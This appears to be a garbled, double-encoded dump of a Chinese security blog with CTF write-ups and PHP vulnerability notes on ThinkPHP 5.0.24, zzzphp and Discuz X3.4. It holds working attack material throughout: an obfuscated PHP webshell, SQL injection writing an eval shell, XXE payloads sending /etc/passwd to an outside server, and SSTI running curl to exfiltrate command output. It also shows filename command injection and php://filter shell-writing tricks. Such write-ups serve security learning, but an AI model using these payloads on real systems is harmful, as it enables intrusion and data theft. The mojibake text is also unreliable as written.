1&lt;?=$_=[];$__.=$_;$____=$_==$_;$___=~åŒ—[$____];$___.=~å†…[$____];$___.=~åŒ—[$____];$___.=~è‹[$____];$___.=~çš„[$____];$___.=~å’©[$____];$_____=_;$_____.=~è¯¾[$____];$_____.=~å°¬[$____];$_____.=~ç¬”[$____];$_____.=~ç«¯[$____];$__________=$$_____;$___($__________[~ç[$____]]); [SUCTF 2018]MultiSQLæ³¨å†Œç™»å½• æ„é€ ?id=2-1ç¡®è®¤å­˜åœ¨æ•°å­—å‹sqlæ³¨å…¥ï¼Œä½†æ˜¯æ ¹æ®ä¸€äº›payloadçš„å›æ˜¾çŒœæµ‹å­˜åœ¨ä¸€äº›æ›¿æ¢ andå¯ä»¥ç”¨^ä»£æ›¿ï¼Œä½†æ˜¯selectä¹Ÿæ— æ³•ä½¿ç”¨ï¼ŒçŒœäº†å‡ ä¸ªå­—æ®µæ²¡æˆåŠŸï¼Œåªèƒ½å°è¯•å †å æ³¨å…¥ ?id=1;select 1;æ²¡æœ‰å‡ºç°500ï¼Œå­˜åœ¨å †å æ³¨å…¥ ä¸€å¼€å§‹æµ‹è¯•æ—¶é—´å»¶è¿Ÿæ²¡ååº”æœ‰ç‚¹è¿· å†™shellæˆåŠŸ 12345print(&quot;select &#39;&lt;?php eval($_POST[_]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php&#39;;&quot;.encode(&#39;hex&#39;))&#x3D;&gt;?id&#x3D;1;set @a &#x3D; 0x73656c65637420273c3f706870206576616c28245f504f53545b5f5d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f7368656c6c312e706870273b;prepare smtm_test from @a;execute smtm_test; load_file()è¯»å–æ–‡ä»¶ 123456789function waf($str)&#123; $black_str = \"/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i\"; $str = preg_replace($black_str, \"@@\",$str); return addslashes($str);&#125; ##############04/12 [SUCTF 2018]Homework å‚è€ƒï¼šhttps://www.jianshu.com/p/825d08f530c5 æ³¨å†Œç™»å½•ï¼Œå‘ç°æœ‰ä¸€æ®µè‡ªå®šä¹‰calcç±»çš„æºç ï¼Œç‚¹å‡»calc 1show.php?module&#x3D;calc&amp;args[]&#x3D;2&amp;args[]&#x3D;a&amp;args[]&#x3D;2 æ ¹æ®urlï¼ŒçŒœæµ‹ä¼ å…¥çš„moduleä¸ºç±»åï¼Œargs[]ä¸ºå‚æ•° ä¹‹å‰æåˆ°è¿‡ï¼Œå¦‚æœèƒ½å®ä¾‹åŒ–ä»»ä½•ç±»ï¼Œå¯ä»¥åˆ©ç”¨ä¸€äº›åŸç”Ÿç±» å¯è·å–ç›®å½•ï¼šDirectoryIterator XXEï¼šSimpleXMLElement åˆ›å»ºç©ºç™½æ–‡ä»¶ï¼šSQLite3 å…¶ä¸­å±å®³è¾ƒå¤§çš„æ˜¯XXEï¼Œçœ‹ä¸‹SimpleXMLElementçš„å®˜æ–¹æ–‡æ¡£ 1final public SimpleXMLElement::__construct ( string $data [, int $options &#x3D; 0 [, bool $data_is_url &#x3D; FALSE [, string $ns &#x3D; &quot;&quot; [, bool $is_prefix &#x3D; FALSE ]]]] ) æ³•ä¸€ã€ ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯è¦è§£æçš„æ•°æ®ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¸€äº›é€‰é¡¹ï¼Œè¿™é‡Œå¯ä»¥ä¼ 2ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®trueæ˜¯å…è®¸urlæ ¼å¼ 1?module&#x3D;SimpleXMLElement&amp;args[]&#x3D;http:&#x2F;&#x2F;174.1.248.102&#x2F;obj.xml&amp;args[]&#x3D;2&amp;args[]&#x3D;true obj.xml 1234567&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM \"http://174.1.248.102/test.xml\"&gt;%int;%all;%send;]&gt; test.xml 12&lt;!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\"&gt;&lt;!ENTITY % all \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://174.1.248.102:1234/?%payl;'&gt;\"&gt; ä½†æ˜¯vpsæ²¡æœ‰æ”¶åˆ° è€Œä¸”æ„Ÿè§‰payloadçš„ç¬¬ä¸‰ä¸ªå‚æ•°ç”±äºgetä¼ å‚å¾—åˆ°çš„æ˜¯å­—ç¬¦ä¸²çš„true æ³•äºŒã€ ç›´æ¥getä¼ xmlæ•°æ® 1?module&#x3D;SimpleXMLElement&amp;args[]&#x3D;%3C%3Fxml%20version%3D%221.0%22%2B%3F%3E%0A%3C%21DOCTYPE%20r%20%5B%0A%3C%21ELEMENT%20r%20ANY%20%3E%0A%3C%21ENTITY%20%25%20sp%20SYSTEM%22http%3A%2F%2F174.1.248.102%2Ftest.xml%22%3E%0A%25sp%3B%0A%25param1%3B%0A%5D%3E%0A%3Cr%3E%26exfil%3B%3C%2Fr%3E&amp;args[]&#x3D;2 args[0] 12345678&lt;?xml version=\"1.0\"+?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY % sp SYSTEM\"http://174.1.248.102/test.xml\"&gt;%sp;%param1;]&gt;&lt;r&gt;&amp;exfil;&lt;/r&gt; test.xml 12&lt;!ENTITY % data SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"&gt;&lt;!ENTITY % param1 \"&lt;!ENTITY exfil SYSTEM 'http://174.1.248.102:1234/?%data;'&gt;\"&gt; è¿˜æ˜¯æ²¡å›æ˜¾ï¼Œè¿· #################4/22 [CISCN2019 åä¸œå—èµ›åŒº]Web4è§‚å¯Ÿurl 1http:&#x2F;&#x2F;204dea1c-9cd5-4b09-a804-60330cd1abad.node3.buuoj.cn&#x2F;read?url&#x3D;https:&#x2F;&#x2F;baidu.com æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼Œfile:///etc/passwdï¼Œæç¤ºhackï¼Œå¯èƒ½æ˜¯pythonæ¡†æ¶ï¼Œå°è¯•ä¹‹å‰é‡åˆ°è¿‡çš„trick 1local_file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd è¯»å–/app/app.py æ€»æ‰€å‘¨çŸ¥ï¼Œåœ¨çŸ¥é“secretçš„æƒ…å†µä¸‹ï¼Œflaskçš„sessionæ˜¯å¯ä»¥ä¼ªé€ çš„ã€‚ è€Œè¿™é‡Œseedæ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼ï¼Œå³uuid.getnode()ï¼Œè¯¥å‡½æ•°è¯»å–Macåœ°å€å¹¶è½¬æ¢ä¸ºæ•´æ•°ï¼Œè¯»ä¸€ä¸‹Macåœ°å€ 102:42:ae:00:71:db æœ¬åœ°è®¡ç®— 12345import randomrandom.seed(0x0242ae0071db)print(str(random.random()*233))# 108.741627655 123456[root@glotozz]~/flask-session-cookie-manager# python flask_session_cookie_manager2.py decode -c eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Xp_Bnw.P0_aiNv2EhCkrwMkiZJAR3SNhG0&#123;\"username\":&#123;\" b\":\"d3d3LWRhdGE=\"&#125;&#125;[root@glotozz]~/flask-session-cookie-manager# python flask_session_cookie_manager2.py decode -c eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Xp_Bnw.P0_aiNv2EhCkrwMkiZJAR3SNhG0 -s 108.741627655&#123;u'username': 'www-data'&#125;[root@glotozz]~/flask-session-cookie-manager# python flask_session_cookie_manager2.py encode -t \"&#123;u'username': 'fuck'&#125;\" -s 108.741627655eyJ1c2VybmFtZSI6eyIgYiI6IlpuVmphdz09In19.Xp_G0Q.o18gCvJAyo3MsLYZBx2UcOUxHuw æ›¿æ¢cookieä¸­çš„sessionè®¿é—®/flag [GWCTF 2019]ä½ çš„åå­—1&#123;&#123; è¢«è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨ 1&#123;% if %&#125;&#123;% endif %&#125; é»‘åå• 12345678910blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval', 'if', 'for', ' subprocess', 'file', 'open', 'popen', 'builtins', 'compile', 'execfile', 'from_pyfile', 'local', 'self', 'item', 'getitem', 'getattribute', 'func_globals', 'config']for no in blacklist: while True: if no in s: s = s.replace(no, '') else: breakreturn s æŒ‰ç…§é¡ºåºå¯¹é»‘åå•è¿›è¡Œæ›¿æ¢ payloadï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°åˆ©ç”¨åŒå†™ç»•è¿‡ 1&#123;% iconfigf &#39;&#39;.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__[&#39;linecache&#39;].oconfigs.system(&#39;curl http:&#x2F;&#x2F;174.0.119.71&#x2F;?a&#x3D;&#96;ls &#x2F;|base64&#96;&#39;) %&#125;1&#123;% endiconfigf %&#125; 1&#123;% iconfigf &#39;&#39;.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__[&#39;linecache&#39;].oconfigs.system(&#39;curl http:&#x2F;&#x2F;174.0.119.71&#x2F;?a&#x3D;&#96;cat &#x2F;flag_1s_Hera|base64&#96;&#39;) %&#125;1&#123;% endiconfigf %&#125; [CSAWQual 2019]Web_Unagiæç¤ºä¸Šä¼ ä¸€ä¸ªxmlï¼Œå°è¯•xxeï¼Œ/user.php å­˜åœ¨å›æ˜¾ï¼Œç›´æ¥å¸¦å‡º 12345678910111213&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE users [&lt;!ENTITY xxe SYSTEM \"file:///flag\" &gt;]&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; Bob&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;intro&gt;&amp;xxe;&lt;/intro&gt; &lt;/user&gt;&lt;/users&gt; æç¤ºWAFï¼ŒXXEç¼–ç è½¬æ¢ä¸ºUTF-16ç»•è¿‡ 1iconv -f utf8 -t utf16 simple.xml&gt;1.xml [N1CTF 2018]eating_cmsè§‚å¯Ÿurl 1http:&#x2F;&#x2F;8d4b1741-6dfd-4df8-a2a4-63b2fce7ad04.node3.buuoj.cn&#x2F;user.php?page&#x3D;guest# å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä¼ªåè®®è¯»å– 123456789&lt;?phprequire_once \"function.php\";if(isset($_SESSION['login'] ))&#123; Header(\"Location: user.php?page=info\");&#125;else&#123; include \"templates/index.html\";&#125;?&gt; è¯»å–function.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130&lt;?phpsession_start();require_once \"config.php\";function Hacker()&#123; Header(\"Location: hacker.php\"); die();&#125;function filter_directory()&#123; $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\"]; $uri = parse_url($_SERVER[\"REQUEST_URI\"]); //å¯ä»¥åœ¨urlä¸­å¢åŠ å¤šä¸ª//æ¥ç»•è¿‡ parse_str($uri['query'], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function filter_directory_guest()&#123; $keywords = [\"flag\",\"manage\",\"ffffllllaaaaggg\",\"info\"]; $uri = parse_url($_SERVER[\"REQUEST_URI\"]); parse_str($uri['query'], $query);// var_dump($query);// die(); foreach($keywords as $token) &#123; foreach($query as $k =&gt; $v) &#123; if (stristr($k, $token)) hacker(); if (stristr($v, $token)) hacker(); &#125; &#125;&#125;function Filter($string)&#123; global $mysqli; $blacklist = \"information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password\"; $whitelist = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+&gt;&lt;\"; for ($i = 0; $i &lt; strlen($string); $i++) &#123; if (strpos(\"$whitelist\", $string[$i]) === false) &#123; Hacker(); &#125; &#125; if (preg_match(\"/$blacklist/is\", $string)) &#123; Hacker(); &#125; if (is_string($string)) &#123; return $mysqli-&gt;real_escape_string($string); &#125; else &#123; return \"\"; &#125;&#125;function sql_query($sql_query)&#123; global $mysqli; $res = $mysqli-&gt;query($sql_query); return $res;&#125;function login($user, $pass)&#123; $user = Filter($user); $pass = md5($pass); $sql = \"select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'\"; echo $sql; $res = sql_query($sql);// var_dump($res);// die(); if ($res-&gt;num_rows) &#123; $data = $res-&gt;fetch_array(); $_SESSION['user'] = $data[username_which_you_do_not_know]; $_SESSION['login'] = 1; $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too]; return true; &#125; else &#123; return false; &#125; return;&#125;function updateadmin($level,$user)&#123; $sql = \"update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' \"; echo $sql; $res = sql_query($sql);// var_dump($res);// die();// die($res); if ($res == 1) &#123; return true; &#125; else &#123; return false; &#125; return;&#125;function register($user, $pass)&#123; global $mysqli; $user = Filter($user); $pass = md5($pass); $sql = \"insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')\"; $res = sql_query($sql); return $mysqli-&gt;insert_id;&#125;function logout()&#123; session_destroy(); Header(\"Location: index.php\");&#125;?&gt; æ ¹æ®é»‘åå•ï¼Œè¯»å–ffffllllaaaaggg 1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(\"you can not visit it directly\");&#125;else &#123; echo \"you can find sth in m4aaannngggeee\";&#125;?&gt; è¯»å– 1234567&lt;?phpif (FLAG_SIG != 1)&#123; die(\"you can not visit it directly\");&#125;include \"templates/upload.html\";?&gt; è®¿é—®templates/upload.htmlï¼Œè¯»å–upllloadddd.php 123456789101112131415161718192021222324252627&lt;?php$allowtype = array(\"gif\",\"png\",\"jpg\");$size = 10000000;$path = \"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\";$filename = $_FILES['file']['name'];if(is_uploaded_file($_FILES['file']['tmp_name']))&#123; if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename))&#123; die(\"error:can not move\"); &#125;&#125;else&#123; die(\"error:not an upload fileÃ¯Â¼Â\");&#125;$newfile = $path.$filename;echo \"file upload success&lt;br /&gt;\";echo $filename;//å‘½ä»¤æ‰§è¡Œ$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");echo \"&lt;img src='data:image/png;base64,\".$picdata.\"'&gt;&lt;/img&gt;\";if($_FILES['file']['error']&gt;0)&#123; unlink($newfile); die(\"Upload file error: \");&#125;$ext = array_pop(explode(\".\",$_FILES['file']['name']));if(!in_array($ext,$allowtype))&#123; unlink($newfile);&#125;?&gt; è¿™ä»£ç æœ€åæ‰å¯¹åç¼€è¿›è¡Œåˆ¤æ–­ï¼Œå› æ­¤æ§åˆ¶æ–‡ä»¶åå‘½ä»¤æ‰§è¡Œå³å¯ ä½¿ç”¨#æ³¨é‡Š 123456789;ls &#x2F;;#&#x3D;&gt;æ²¡æœ‰ç»“æœ;ls;#&#x3D;&gt;æœ‰ç»“æœ;ls -la ..;#&#x3D;&gt;åˆç»“æœ;cat ..&#x2F;flag_233333;#&#x3D;&gt;æ²¡æœ‰ç»“æœ,çŒœæµ‹æ˜¯æ— æ³•ä½¿ç”¨&#x2F;,ç»è¿‡æµ‹è¯•å‘ç°$_FILES[&#39;file&#39;][&#39;name&#39;]åªä¼šå–&#x2F;åé¢çš„å†…å®¹,å¯ä»¥ä½¿ç”¨..è·³è½¬;cd ..;cat flag_233333;# [BSidesCF 2019]SVGMagicConvert SVG to PNG with Magicï¼Œè¿™é‡Œçš„è€ƒç‚¹æ˜¯XXE 1234567&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE note [&lt;!ENTITY file SYSTEM \"file:///proc/self/cwd/flag.txt\" &gt;]&gt;&lt;svg height=\"100\" width=\"1000\"&gt; &lt;text x=\"10\" y=\"20\"&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt; [HITCON 2015]Babyfirst","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"tp5.0.24ååºåˆ—åŒ–é“¾åœ¨Windowsä¸‹å†™æ–‡ä»¶çš„æ–¹æ³•","slug":"tp5-0-24ååºåˆ—åŒ–é“¾åœ¨Windowsä¸‹å†™æ–‡ä»¶çš„æ–¹æ³•","date":"2020-04-01T01:50:42.000Z","updated":"2020-04-04T08:10:02.936Z","comments":true,"path":"2020/04/01/tp5-0-24ååºåˆ—åŒ–é“¾åœ¨Windowsä¸‹å†™æ–‡ä»¶çš„æ–¹æ³•/","link":"","permalink":"https://glotozz.github.io/2020/04/01/tp5-0-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%9C%A8Windows%E4%B8%8B%E5%86%99%E6%96%87%E4%BB%B6%E7%9A%84%E6%96%B9%E6%B3%95/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• å‰è¨€ demo1 demo2 demo3 å‚è€ƒé“¾æ¥ å‰è¨€ ä¹‹å‰åˆ†ætp5.0.24ååºåˆ—åŒ–é“¾æœ€ååªèƒ½åœ¨linuxåˆ©ç”¨rot13ç¼–ç å†™å…¥æ–‡ä»¶æˆåŠŸï¼Œå› ä¸ºwindowså¯¹æ–‡ä»¶åæœ‰é™åˆ¶ï¼Œè€Œbase64å› ä¸ºåœ¨æ–‡ä»¶å†…å®¹ä¸­å­˜åœ¨=è€Œæ— æ³•æ­£å¸¸è§£ç å†™å…¥ã€‚ æ˜¨å¤©çœ‹åˆ°ä¸€ç¯‡åœ¨windowsä¸‹å†™æ–‡ä»¶çš„åŠæ³•ï¼Œåˆ©ç”¨convert.iconv.*è¿‡æ»¤å™¨ï¼Œç­‰ä»·äºiconv() demo1123&lt;?php $cc&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7&#x2F;resource&#x3D;123.txt&#39;; file_put_contents($cc,&#39;&#x3D;&#39;); ç»“æœä¸º+AD0-ï¼Œè€Œ+AD0-èƒ½è¢«convert.base64-decodeè§£æè€Œä¸æŠ¥é”™ demo2123&lt;?php $dd&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;1.txt&#39;; file_put_contents($dd,&#39;Z3188&#x3D;&#39;); ç»“æœå¦‚ä¸‹ï¼Œå› æ­¤åé¢å¯ä»¥é€šè¿‡ç®€å•çš„fuzz demo312345&lt;?php $payload&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;xaaPD9waHAgcGhwaW5mbygpOyAgPz4g&#x2F;..&#x2F;a.php&#39;; $filename&#x3D;$payload.&#39;468bc8d30505000a2d7d24702b2cda94.php&#39;; $data&#x3D;&quot;&lt;?php\\n&#x2F;&#x2F;000000000000\\n exit();?&gt;\\n&quot;.serialize($payload.&#39;647c4f96a28a577173d6e398eefcc3fe.php&#39;); file_put_contents($filename, $data); =====================åˆ†å‰²çº¿4/2 ä»Šå¤©çœ‹äº†pç‰›æ¨äº†ä¸€ç¯‡æ–‡ç« ï¼šä¸€æ¬¡â€œSSRFâ€“&gt;RCEâ€çš„è‰°éš¾åˆ©ç”¨ é‡Œé¢æåˆ°äº†tp5.0.24å¼€å¯çŸ­æ ‡ç­¾æƒ…å†µä¸‹ï¼ˆrot13ä¼šå¯¼è‡´è¯­æ³•é”™è¯¯ï¼‰æ—¶çš„è§£å†³åŠæ³•ã€‚ 1php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-4LE.UCS-4BE&#x2F;resource&#x3D;abcd å‡½æ•°ä¼šå°†ç›®æ ‡4ä½ä¸€åè½¬,ä»è€Œç»•è¿‡çŸ­æ ‡ç­¾ã€‚ å¦‚æœä»ç„¶å†™å…¥ä¸ºç©ºï¼Œå¾ˆæœ‰å¯èƒ½è®¾ç½®äº†php strictæ¨¡å¼ï¼Œ å…³é”®æ–‡ä»¶çš„æ€»å­—ç¬¦æ•°ä¸èƒ½è¢«4æ•´é™¤(é™¤åä½™2ï¼Œå¦‚æœæ·»åŠ 2å­—ç¬¦ï¼Œåˆ™å†™å…¥æ•°æ®ä¸èƒ½æ­£å¸¸æ˜¾ç¤ºä¸ºshell)å¯¼è‡´å†™å…¥ä¸ºç©ºã€‚ å¯ä»¥åˆ©ç”¨ä¸‹é¢çš„æ–¹æ³•2ä½ä¸€åè½¬ 1php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;xxxx ä¸¾ä¾‹ 123456&lt;?php echo iconv(&#39;UCS-2LE&#39;, &#39;UCS-2BE&#39;, &quot;&lt;?php phpinfo();?&gt;&quot;); $payload&#x3D;&#39;php:&#x2F;&#x2F;filter&#x2F;&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;?&lt;hp phpipfn(o;)&gt;?&#39;; $filename&#x3D;$payload.&#39;468bc8d30505000a2d7d24702b2cda94.php&#39;; $data&#x3D;&quot;&lt;?php\\n&#x2F;&#x2F;000000000000\\n exit();?&gt;\\n&quot;.serialize($payload.&#39;647c4f96a28a577173d6e398eefcc3fe.php&#39;); file_put_contents($filename, $data); ========================åˆ†å‰²çº¿ ä»¥åŠpç‰›åœ¨å°å¯†åœˆè¯„è®ºä¸­æåˆ°çš„åˆ©ç”¨strip_tagså»é™¤= 1php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.strip_tags|convert.base64-decode&#x2F;resource&#x3D;shell.php ä½†æ˜¯æˆ‘æµ‹è¯•äº†ä¸‹å‘ç°å¹¶ä¸è¡Œã€‚ã€‚ å‚è€ƒé“¾æ¥ https://xz.aliyun.com/t/7457","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"zzzphp<=1.7.3åå°æ–‡ä»¶ä¸Šä¼ getshell","slug":"zzzphp-1-7-3åå°æ–‡ä»¶ä¸Šä¼ getshell","date":"2020-03-31T17:09:49.000Z","updated":"2020-04-01T03:19:18.784Z","comments":true,"path":"2020/04/01/zzzphp-1-7-3åå°æ–‡ä»¶ä¸Šä¼ getshell/","link":"","permalink":"https://glotozz.github.io/2020/04/01/zzzphp-1-7-3%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç¯å¢ƒæ­å»º æ¼æ´åˆ†æ æ¼æ´å¤ç° æ€»ç»“ å‚è€ƒé“¾æ¥ ç¯å¢ƒæ­å»ºæ¼æ´å½±å“ï¼š&lt;=zzzphp_v1.7.3 æ­å»ºäº†v_1.7.0çš„ç‰ˆæœ¬ æ¼æ´åˆ†æinc/zzz_file.php è‡ªå®šä¹‰ä¸Šä¼ ç›®å½•ï¼Œè·Ÿè¿›upload() ä¼ å…¥typeå¯ä»¥è‡ªå®šä¹‰åç¼€ç™½åå• è¿™é‡Œå¯ä»¥è®¾ç½®é»‘åå•å¤–çš„åç¼€ï¼Œæœ¬æ¥å¯ä»¥åˆ©ç”¨åç¼€phtmlï¼ŒæŸäº›ç¯å¢ƒé»˜è®¤æ˜¯è§£æçš„ï¼Œæ¯”å¦‚æˆ‘kaliçš„apache2ï¼Œä½†æ˜¯è¿™é‡Œé•¿åº¦é™åˆ¶ä¸º4ï¼ŒåŒ…æ‹¬.htaccesså’Œ.user.iniä¹Ÿè¢«é™åˆ¶äº†ã€‚é‚ä½œç½¢ å‡å¦‚æœåŠ¡å™¨æ— æ³•è§£æï¼Œé™åˆ¶äº†ä¸Šä¼ ç™½åå•pdfï¼Œzipï¼Œå›¾ç‰‡ã€‚å¯ä»¥è€ƒè™‘ä»è‡ªè§£å‹å…¥æ‰‹ã€‚æ—¢ç„¶å­˜åœ¨ä¸Šä¼ å‹ç¼©æ–‡ä»¶ï¼Œä¸€èˆ¬éƒ½å­˜åœ¨è§£å‹å‡½æ•°ã€‚ å…¨å±€æœç´¢unzip admin771/save.php è·Ÿè¿›getfiles() æ ¹æ®æ³¨é‡Šï¼Œéå†è·å–ç›®å½•ä¸‹çš„æŒ‡å®šç±»å‹çš„æ–‡ä»¶ï¼Œç„¶åè§£å‹ä¿å­˜è‡³$savepath é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠä¹‹å‰çš„zipä¸Šä¼ åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹runtime/zip æ¼æ´å¤ç°admin771/save.php?act=upload è§£å‹åˆ°runtime/updata/ä¸‹ è®¿é—®a.php æ€»ç»“åˆå­¦åˆ°ä¸€ç§æ–°çš„ç»„åˆåˆ©ç”¨é“¾ã€‚ å‚è€ƒé“¾æ¥ https://xz.aliyun.com/t/6916","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Discuz! X3.4åå°sqlæ³¨å…¥","slug":"Discuz-X3-4åå°sqlæ³¨å…¥","date":"2020-03-31T03:06:02.000Z","updated":"2020-04-01T12:39:58.009Z","comments":true,"path":"2020/03/31/Discuz-X3-4åå°sqlæ³¨å…¥/","link":"","permalink":"https://glotozz.github.io/2020/03/31/Discuz-X3-4%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç¯å¢ƒæ­å»º æ¼æ´åˆ†æ æ¼æ´å¤ç° æ¼æ´ä¿®å¤ æ€»ç»“ å‚è€ƒé“¾æ¥ ç¯å¢ƒæ­å»ºå½±å“ç‰ˆæœ¬ï¼š Discuz! Xç³»åˆ—å…¨ç‰ˆæœ¬ æˆªæ­¢åˆ° Discuz! X3.4 R20191201 UTF-8 https://www.discuz.net/thread-3847642-1-1.html æ¼æ´åˆ†æuc_client/model/base.php è·Ÿè¿›init_note() è·Ÿè¿›note_exist() è·Ÿè¿›è¿™ä¸ªUC_APPIDæ¥è‡ªé…ç½®æ–‡ä»¶ï¼Œè€Œä»phpæ–‡ä»¶ä¸­å–å‡ºå­—ç¬¦æ˜¯æ²¡æœ‰è½¬ä¹‰çš„ï¼ˆå’ŒäºŒæ¬¡æ³¨å…¥åŒç†ï¼‰ å…¨å±€æœç´¢è®¾ç½®çš„åœ°æ–¹UC_APPIDï¼Œæˆ–è€…config_ucenter.php source/admincp/admincp_setting.php 1$settingnew &#x3D; $_GET[&#39;settingnew&#39;]; ç»è¿‡addslashes()å¤„ç† ç™»å½•åå°å³å¯ä¿®æ”¹é…ç½® æ¼æ´å¤ç°å‰ç«¯ è·¯ç”± admin.php GETä¼ å…¥actionï¼Œè·Ÿè¿›admincpfile() è®¿é—®admin.php?action=setting+POSTä¼ å‚ æ¼æ´ä¿®å¤giteeä¸­çš„ä¿®å¤ å¢åŠ äº†å‡ å¤„å¯¹UC_APPIDåˆ¤æ–­ æ€»ç»“é€šè¿‡è¯»å–é…ç½®æ–‡ä»¶è¿›è¡ŒäºŒæ¬¡æ³¨å…¥ä¹Ÿæ˜¯ä¸€ç§æ€è·¯ã€‚ å‚è€ƒé“¾æ¥ https://xz.aliyun.com/t/6927","categories":[],"tags":[{"name":"phpä»£ç å®¡è®¡","slug":"phpä»£ç å®¡è®¡","permalink":"https://glotozz.github.io/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"Ezpop_Revenge-wp","slug":"Ezpop-Revenge-wp","date":"2020-03-29T04:39:49.000Z","updated":"2020-04-01T12:36:51.787Z","comments":true,"path":"2020/03/29/Ezpop-Revenge-wp/","link":"","permalink":"https://glotozz.github.io/2020/03/29/Ezpop-Revenge-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• ç®€å•åˆ†æ æ€è·¯ä¸€ æ€è·¯äºŒ ä¸‹åˆçœ‹é˜Ÿé‡Œå¸ˆå‚…ä»¬åœ¨è®¨è®ºè¿™é¢˜ï¼Œäºæ˜¯ä¹Ÿæ¥åˆ’åˆ’æ°´ã€‚ www.zipæºç æ³„éœ²ï¼ŒTypechoæ¡†æ¶ï¼Œåªè®°å¾—æœ‰ä¸ªè¿œå¤æ—¶æœŸååºåˆ—åŒ–æ¼æ´ 